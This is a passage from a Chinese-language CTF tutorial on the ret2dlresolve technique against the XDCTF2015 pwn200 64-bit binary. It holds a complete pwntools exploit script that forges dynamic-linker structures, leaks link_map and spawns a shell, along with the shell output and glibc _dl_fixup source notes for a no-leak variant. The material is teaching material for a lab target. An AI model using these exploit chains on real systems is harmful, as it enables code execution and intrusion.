    <span class="token comment" spellcheck="true"># rbx = 0</span>
    <span class="token comment" spellcheck="true"># rbp = 1, enable not to jump</span>
    <span class="token comment" spellcheck="true"># r12 should be the function that you want to call</span>
    <span class="token comment" spellcheck="true"># rdi = edi = r13d</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdx = r15</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
    <span class="token keyword">return</span> payload


<span class="token keyword">def</span> <span class="token function">ret2dlresolve_x64</span><span class="token punctuation">(</span>elf<span class="token punctuation">,</span> store_addr<span class="token punctuation">,</span> func_name<span class="token punctuation">,</span> resolve_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr

    rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rela.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    relaent <span class="token operator">=</span> elf<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_RELAENT"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># reloc entry size</span>

    dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    syment <span class="token operator">=</span> elf<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_SYMENT"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># symbol entry size</span>

    dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr


    <span class="token comment" spellcheck="true"># construct fake function string</span>
    func_string_addr <span class="token operator">=</span> store_addr
    resolve_data <span class="token operator">=</span> func_name <span class="token operator">+</span> <span class="token string">"\x00"</span>

    <span class="token comment" spellcheck="true"># construct fake symbol</span>
    symbol_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> symbol_addr <span class="token operator">-</span> dynsym
    pad <span class="token operator">=</span> syment <span class="token operator">-</span> offset <span class="token operator">%</span> syment <span class="token comment" spellcheck="true"># align syment size</span>
    symbol_addr <span class="token operator">=</span> symbol_addr<span class="token operator">+</span>pad
    symbol <span class="token operator">=</span> p32<span class="token punctuation">(</span>func_string_addr<span class="token operator">-</span>dynstr<span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    symbol_index <span class="token operator">=</span> <span class="token punctuation">(</span>symbol_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">24</span>
    resolve_data <span class="token operator">+=</span><span class="token string">'\x00'</span><span class="token operator">*</span>pad
    resolve_data <span class="token operator">+=</span> symbol

    <span class="token comment" spellcheck="true"># construct fake reloc </span>
    reloc_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> reloc_addr <span class="token operator">-</span> rel_plt
    pad <span class="token operator">=</span> relaent <span class="token operator">-</span> offset <span class="token operator">%</span> relaent <span class="token comment" spellcheck="true"># align relaent size</span>
    reloc_addr <span class="token operator">+=</span>pad
    reloc_index <span class="token operator">=</span> <span class="token punctuation">(</span>reloc_addr<span class="token operator">-</span>rel_plt<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">24</span>
    rinfo <span class="token operator">=</span> <span class="token punctuation">(</span>symbol_index<span class="token operator">&lt;&lt;</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">7</span>
    write_reloc <span class="token operator">=</span> p64<span class="token punctuation">(</span>resolve_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rinfo<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    resolve_data <span class="token operator">+=</span><span class="token string">'\x00'</span><span class="token operator">*</span>pad
    resolve_data <span class="token operator">+=</span>write_reloc

    resolve_call <span class="token operator">=</span> p64<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>reloc_index<span class="token punctuation">)</span>
    <span class="token keyword">return</span> resolve_data<span class="token punctuation">,</span> resolve_call


io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

store_addr <span class="token operator">=</span> bss_addr<span class="token operator">+</span><span class="token number">0x100</span>
sh <span class="token operator">=</span> <span class="token string">"/bin/sh\x00"</span>

<span class="token comment" spellcheck="true"># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">112</span><span class="token operator">+</span><span class="token number">8</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
resolve_data<span class="token punctuation">,</span> resolve_call <span class="token operator">=</span> ret2dlresolve_x64<span class="token punctuation">(</span>elf<span class="token punctuation">,</span> store_addr<span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>store_addr<span class="token punctuation">,</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># send resolve data</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>resolve_data<span class="token operator">+</span>sh<span class="token punctuation">)</span>
bin_sh_addr <span class="token operator">=</span> store_addr<span class="token operator">+</span>len<span class="token punctuation">(</span>resolve_data<span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># rop = ROP("./main_partial_relro_64")</span>
<span class="token comment" spellcheck="true"># rop.raw(offset*'\x00')</span>
<span class="token comment" spellcheck="true"># sh = "/bin/sh\x00"</span>
<span class="token comment" spellcheck="true"># bin_sh_addr = store_addr+len(resolve_data)</span>
<span class="token comment" spellcheck="true"># rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))</span>
<span class="token comment" spellcheck="true"># rop.raw(vuln_addr)</span>
<span class="token comment" spellcheck="true"># rop.raw("a"*(256-len(rop.chain())))</span>
<span class="token comment" spellcheck="true"># io.send(rop.chain())</span>
<span class="token comment" spellcheck="true"># io.send(sh)</span>


<span class="token comment" spellcheck="true"># leak link_map addr</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x601008</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
link_map_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>link_map_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>link_map_addr<span class="token operator">+</span><span class="token number">0x1c8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x00000000004007a3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 0x00000000004007a3: pop rdi; ret; </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>resolve_call<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># rop.raw('\x00'*(256-len(rop.chain())))</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这时候即可利用成功</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ python exp-manual4.py
[+] Starting local process './main_partial_relro_64': pid 47378
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] running in new terminal: /usr/bin/gdb -q  "./main_partial_relro_64" 47378
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] Loaded 14 cached gadgets for './main_partial_relro_64'
0x7f0d01125170
[*] Switching to interactive mode
$ whoami
iromise<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="Second-try-no-leak"><a href="#Second-try-no-leak" class="headerlink" title="Second try - no leak"></a>Second try - no leak</h5><p>可以看出，在上面的测试中，我们仍然利用 write 函数泄露了 link_map 的地址，那么，如果程序中没有输出函数，我们是否还能够发起利用呢？答案是可以的。我们再来看一下 <code>_dl_fix_up</code> 的实现</p>
<pre class="line-numbers language-c"><code class="language-c">    <span class="token comment" spellcheck="true">/* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */</span>
    <span class="token comment" spellcheck="true">// 判断符号的可见性</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span><span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// 获取符号的版本信息</span>
        <span class="token keyword">const</span> <span class="token keyword">struct</span> r_found_version <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">D_PTR</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>
            version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment" spellcheck="true">/* We need to keep the scope around so do some locking.  This is
         not necessary for objects which cannot be unloaded or when
         we are not using any threads (yet).  */</span>
        <span class="token keyword">int</span> flags <span class="token operator">=</span> DL_LOOKUP_ADD_DEPENDENCY<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RTLD_SINGLE_THREAD_P<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">THREAD_GSCOPE_SET_FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            flags <span class="token operator">|</span><span class="token operator">=</span> DL_LOOKUP_GSCOPE_LOCK<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span>
        RTLD_ENABLE_FOREIGN_CALL<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
        <span class="token comment" spellcheck="true">// 查询待解析符号所在的目标文件的 link_map</span>
        result <span class="token operator">=</span> <span class="token function">_dl_lookup_symbol_x</span><span class="token punctuation">(</span>strtab <span class="token operator">+</span> sym<span class="token operator">-></span>st_name<span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sym<span class="token punctuation">,</span> l<span class="token operator">-></span>l_scope<span class="token punctuation">,</span>
                                     version<span class="token punctuation">,</span> ELF_RTYPE_CLASS_PLT<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">/* We are done with the global scope.  */</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>RTLD_SINGLE_THREAD_P<span class="token punctuation">)</span>
            <span class="token function">THREAD_GSCOPE_RESET_FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span>
        RTLD_FINALIZE_FOREIGN_CALL<span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>
        <span class="token comment" spellcheck="true">/* Currently result contains the base load address (or link map)
         of the object that defines sym.  Now add in the symbol
         offset.  */</span>
        <span class="token comment" spellcheck="true">// 基于查询到的 link_map 计算符号的绝对地址: result->l_addr + sym->st_value</span>
        <span class="token comment" spellcheck="true">// l_addr 为待解析函数所在文件的基地址</span>
        value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span>
                                    <span class="token function">SYMBOL_ADDRESS</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> sym<span class="token punctuation">,</span> false<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">/* We already found the symbol.  The module (and therefore its load
         address) is also known.  */</span>
        value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> <span class="token function">SYMBOL_ADDRESS</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> sym<span class="token punctuation">,</span> true<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        result <span class="token operator">=</span> l<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果我们故意将 __builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0) 设置为 0，那么程序就会执行 else 分支。具体的，我们设置 sym-&gt;st_other 不为 0 即可满足这一条件。</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* How to extract and insert information held in the st_other field.  */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> ELF32_ST_VISIBILITY(o)        ((o) &amp; 0x03)</span>
<span class="token comment" spellcheck="true">/* For ELF64 the definitions are the same.  */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> ELF64_ST_VISIBILITY(o)        ELF32_ST_VISIBILITY (o)</span>
<span class="token comment" spellcheck="true">/* Symbol visibility specification encoded in the st_other field.  */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> STV_DEFAULT        0                </span><span class="token comment" spellcheck="true">/* Default symbol visibility rules */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> STV_INTERNAL        1                </span><span class="token comment" spellcheck="true">/* Processor specific hidden class */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> STV_HIDDEN        2                </span><span class="token comment" spellcheck="true">/* Sym unavailable in other modules */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> STV_PROTECTED        3                </span><span class="token comment" spellcheck="true">/* Not preemptible, not exported */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>此时程序计算 value 的方式为</p>
<pre><code>value = l-&gt;l_addr + sym-&gt;st_value</code></pre><p>通过查看 link_map 结构体的<a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map" target="_blank" rel="noopener">定义</a>，可以知道 l_addr 是 link_map 的第一个成员，那么如果我们伪造上述这两个变量，并借助于已有的被解析的函数地址，比如</p>
<ul>
<li>伪造 link_map-&gt;l_addr 为已解析函数与想要执行的目标函数的偏移值，如 addr_system-addr_xxx </li>
<li>伪造 sym-&gt;st_value 为已经解析过的某个函数的 got 表的位置，即相当于有了一个隐式的信息泄露</li>
</ul>
<p>那就可以得到对应的目标地址。</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> link_map
  <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">/* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */</span>
    <span class="token function">ElfW</span><span class="token punctuation">(</span>Addr<span class="token punctuation">)</span> l_addr<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Difference between the address in the ELF
                                   file and the addresses in memory.  */</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>l_name<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Absolute file name object was found in.  */</span>
    <span class="token function">ElfW</span><span class="token punctuation">(</span>Dyn<span class="token punctuation">)</span> <span class="token operator">*</span>l_ld<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Dynamic section of the shared object.  */</span>
    <span class="token keyword">struct</span> link_map <span class="token operator">*</span>l_next<span class="token punctuation">,</span> <span class="token operator">*</span>l_prev<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Chain of loaded objects.  */</span>
    <span class="token comment" spellcheck="true">/* All following members are internal to the dynamic linker.
       They may change without notice.  */</span>
    <span class="token comment" spellcheck="true">/* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */</span>
    <span class="token keyword">struct</span> link_map <span class="token operator">*</span>l_real<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* Number of the namespace this link map belongs to.  */</span>
    Lmid_t l_ns<span class="token punctuation">;</span>
    <span class="token keyword">struct</span> libname_list <span class="token operator">*</span>l_libname<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h>.  */</span>
    <span class="token function">ElfW</span><span class="token punctuation">(</span>Dyn<span class="token punctuation">)</span> <span class="token operator">*</span>l_info<span class="token punctuation">[</span>DT_NUM <span class="token operator">+</span> DT_THISPROCNUM <span class="token operator">+</span> DT_VERSIONTAGNUM
                      <span class="token operator">+</span> DT_EXTRANUM <span class="token operator">+</span> DT_VALNUM <span class="token operator">+</span> DT_ADDRNUM<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>一般而言，至少有 __libc_start_main 已经解析过了。本例中，显然不止这一个函数。</p>
<pre><code>.got:0000000000600FF0 ; ===========================================================================
.got:0000000000600FF0
.got:0000000000600FF0 ; Segment type: Pure data
.got:0000000000600FF0 ; Segment permissions: Read/Write
.got:0000000000600FF0 ; Segment alignment 'qword' can not be represented in assembly
